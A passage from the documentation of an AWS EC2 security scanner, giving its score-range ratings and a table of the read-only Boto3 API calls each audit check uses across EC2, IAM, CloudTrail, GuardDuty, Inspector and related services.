| No Instance Connect endpoint | -1 | LOW | per-VPC |

### Score Ranges

| Range | Rating |
|-------|--------|
| 90–100 | Excellent |
| 70–89 | Good |
| 50–69 | Needs Improvement |
| 0–49 | Critical |

---

## Boto3 API Calls Reference

The scanner makes the following AWS API calls. All calls are read-only (`describe_*`, `get_*`, `list_*`, `batch_get_*`).

### Amazon EC2

| API Call | Used By |
|----------|---------|
| `describe_instances` | Account/region instance enumeration |
| `describe_instance_attribute(Attribute='userData')` | A.4 UserData secrets |
| `describe_security_groups` | B.2, B.3, B.4, B.5, B.6, B.7, G.3, G.4 |
| `describe_network_acls` | B.8 NACL admin ports |
| `describe_vpcs` | B.1 VPC enumeration |
| `describe_flow_logs` | B.1 VPC flow logs |
| `describe_network_interfaces` | B.9 source/dest check, G.4 SG usage |
| `describe_volumes` | C.1 EBS encryption |
| `get_ebs_encryption_by_default` | C.2 EBS default encryption |
| `describe_snapshots` | C.3 snapshot enumeration |
| `describe_snapshot_attribute(Attribute='createVolumePermission')` | C.3 public snapshot detection |
| `get_snapshot_block_public_access_state` | C.7 EBS Snapshot BPA |
| `describe_launch_templates` | Region-level launch-template audit (IMDSv2, public IP, EBS encryption) |
| `describe_launch_template_versions` | Region-level launch-template audit (default version of each template) |
| `describe_addresses` | G.1 unused EIPs |
| `describe_subnets` | B.10 subnet auto-assign |
| `describe_images` | F.2 AMI age, C.6 public AMI |
| `get_serial_console_access_status` | D.2 serial console |
| `describe_instance_connect_endpoints` | D.3 EICE configured |
| `describe_vpc_block_public_access_options` | B.11 VPC BPA |
| `describe_transit_gateways` | B.12 TGW auto-accept |
| `describe_vpn_connections` | B.13 VPN IKEv2 |

### AWS IAM

| API Call | Used By |
|----------|---------|
| `get_instance_profile` | D.1 IAM role analysis |
| `get_policy` | D.1 |
| `get_policy_version` | D.1 |
| `get_role_policy` | D.1 inline role policy |
| `list_attached_role_policies` (via paginator) | D.1 |
| `list_role_policies` (via paginator) | D.1 |

### AWS CloudTrail

| API Call | Used By |
|----------|---------|
| `describe_trails(includeShadowTrails=False)` | E.1 |
| `get_trail_status` | E.1 |
| `get_event_selectors` | E.1 management events |

### Amazon CloudWatch

| API Call | Used By |
|----------|---------|
| `describe_alarms` (paginator, `AlarmTypes=["MetricAlarm"]`) | E.2 |

### AWS Systems Manager (SSM)

| API Call | Used By |
|----------|---------|
| `describe_instance_information` | E.3 SSM-managed |
| `describe_instance_patch_states` | F.1 patch compliance |

### Amazon GuardDuty

| API Call | Used By |
|----------|---------|
| `list_detectors` | E.4 |
| `get_detector` | E.4 (Runtime Monitoring + EC2 agent) |

### Amazon Inspector v2

| API Call | Used By |
|----------|---------|
| `batch_get_account_status` | F.3 EC2 scanning enabled |
| `list_coverage` (via paginator) | F.3 instance coverage |
| `list_findings` (via paginator) | F.3 CRITICAL/HIGH findings |

### AWS Backup

| API Call | Used By |
|----------|---------|
| `describe_protected_resource` | C.4 EBS backup coverage (O(1) per volume) |

---

*This document is auto-derived from the scanner source. The authoritative source for compliance mappings is `ec2_security_scanner/compliance.py`; the authoritative source for the canonical check list is `CHANGELOG.md`. Run `ec2-security-scanner` against your account to produce a per-instance compliance and scoring report.*
